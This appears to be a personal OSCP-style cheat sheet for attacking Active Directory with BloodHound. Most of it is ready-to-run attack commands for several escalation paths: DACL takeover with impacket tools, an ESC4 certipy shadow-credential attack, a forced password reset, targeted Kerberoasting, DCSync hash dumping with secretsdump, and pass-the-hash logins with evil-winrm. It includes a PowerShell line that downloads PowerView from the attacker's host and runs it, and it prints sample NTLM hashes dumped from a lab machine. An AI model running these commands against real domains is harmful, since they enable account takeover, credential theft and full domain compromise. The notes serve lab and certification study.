## Bloodhound Setup
https://www.kali.org/tools/bloodhound/

```
sudo neo4j start
# go to http://localhost:7474 an change default credentials
bloodhound
# authenticate with the new credentials
```
 ## Data collection
### SharpHound
Only on Windows

### BloodHound.py
https://www.kali.org/tools/bloodhound.py/

```
# -c All to collect everything
bloodhound-python -d <domain> -u <user> -p <password> -ns <DC IP> -c All
```
### Import data
1. In BloodHound GUI → click Upload Data (usually top-right, cloud-upload icon).
2. Select the directory or files → pick all your .json files from BloodHound.py.
3. BloodHound will parse and import the data into Neo4j.
   
 ## Running queries
1. Go through all owned accounts and mark them as owned (RMB -> Mark as owned)
2. Go through all interesting accounts and mark as High value
3. Go through pre-built queries, Click on nodes etc.

CLICK RMP ON EDGE -> Help!!!

It will show Abuse commands!!!

## Escalation Paths

### WriteOwner
[User1] --WriteOwner-> [User2/Group2]

https://www.hackingarticles.in/abusing-ad-dacl-writeowner/
```
# User
impacket-owneredit -action write -new-owner '<User1>' -target-dn '<User2 DN copy from BH>' '<domain>'/'<User1>':'<U1 Pass>' -dc-ip <IP>
impacket-dacledit -action write -rights 'FullControl' -principal '<User1>' -target-dn '<User2 DN copy from BH>' '<domain>'/'<User1>':'<U1 Pass>' -dc-ip <IP>
# Group
impacket-owneredit -action write -new-owner '<User1>' -target-dn '<Group2 DN copy from BH>' '<domain>'/'<User1>':'<U1 Pass>' -dc-ip <IP>
impacket-dacledit -action write -rights 'WriteMembers' -principal '<User1>' -target-dn '<Group2 DN copy from BH>' '<domain>'/'<User1>':'<U1 Pass>' -dc-ip <IP>
```
Now either add own account to target group, or reset target account password 
(Reference this link: https://www.hackingarticles.in/abusing-ad-dacl-writeowner/)

In the particular example the target user was Cert Authority user, so I could do this:

http://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.html#vulnerable-certificate-template-access-control---esc4
```
certipy-ad shadow auto -u '<user1>@<domain>' -p "<U1 pass>" -account '<User2>' -dc-ip '<IP>' 
```
### ForceChangePassword
Inside *Evil-WinRM* session
```
IEX (New-ObjectNet.WebClient).DownloadString('http://<KALI IP>:4000/PowerView.ps1')
$SecPassword = ConvertTo-SecureString '<User1 Pass>' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential ('<Domain>\<User1>', SecPassword)
$UserPassword = ConvertToSecureString 'qweQWE123!@#!' -AsPlainText -Force
Set-DomainUserPassword -Identity <User2> -AccountPassword $UserPassword -Credential $Cred
```

### GenericWrite
Use `TargetedKerberoast`

https://github.com/nestef23/my-OSCP-notes/blob/main/Active%20Directory/Kerberoasting.md#targetedkerberospy

### DCSync
```
secretsdump.py '<Domain>'/'<User>':'<Password>'@'<DC Name / IP>'
```
This dumps a lot of hashes
```
[...]
Administrator:500:aad3b435b51404eeaad3b435b51404ee:3dc553ce4b9fd20bd016e098d2d2fd2e:::
administrator.htb\alexander:3601:aad3b435b51404eeaad3b435b51404ee:cdc9e5f3b0631aa3600e0bfec00a0199:::
administrator.htb\emma:3602:aad3b435b51404eeaad3b435b51404ee:11ecd72c969a57c34c819b41b54455c9:::
DC$:1000:aad3b435b51404eeaad3b435b51404ee:cf411ddad4807b5b4a275d31caa1d4b3:::
[...]
```
Use them with `evil-winrm`
```
evil-winrm -i <domain> -u <user> -H'<NT hash - 2nd part>'

```
